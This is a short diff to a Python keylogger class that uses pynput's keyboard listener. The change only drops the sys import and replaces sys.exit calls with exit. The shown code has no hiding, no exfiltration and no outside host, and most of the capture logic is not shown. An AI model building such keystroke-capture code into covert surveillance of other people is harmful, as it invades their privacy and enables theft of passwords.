@@ -1,6 +1,6 @@
 from abc import ABC,abstractmethod
 from pynput.keyboard import Key,Listener
-import sys
+
 
 
 class IKeyLogger(ABC):
@@ -29,7 +29,7 @@ class KeyLogger(IKeyLogger):
         try:
             if key.char == '\x04':  # Ctrl+D
                 print("Exiting...")
-                sys.exit(0)
+                exit(0)
         except AttributeError:
             pass
 
@@ -58,7 +58,7 @@ class KeyLogger(IKeyLogger):
                 return key_list[1]
 
     def stop_logging(self) -> None:
-        sys.exit(0)
+        exit(0)
 
 KeyLogger().start_logging()
 
